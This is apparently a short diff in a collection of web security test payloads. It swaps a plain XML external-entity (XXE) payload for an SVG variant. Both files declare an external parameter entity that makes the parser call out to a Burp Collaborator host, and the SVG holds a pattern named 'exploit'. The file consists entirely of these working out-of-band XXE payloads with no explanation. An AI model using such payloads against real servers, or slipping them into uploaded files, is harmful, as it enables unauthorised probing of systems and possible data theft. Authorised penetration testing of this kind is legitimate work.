@@ -1,2 +1,14 @@
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://cuajnuzinbub7fvvhllpar4it9z8nx.burpcollaborator.net" > %xxe; ]>
+<!DOCTYPE svg [
+<!ENTITY % outside SYSTEM "http://ub914cg04tbtoxcdy327r9l0argr4g.burpcollaborator.net">
+%outside;
+]>
+
+<svg>
+<defs>
+<pattern id="exploit">
+  <text x="10" y="10">
+    abc
+  </text>
+</pattern>
+</defs>
+</svg>
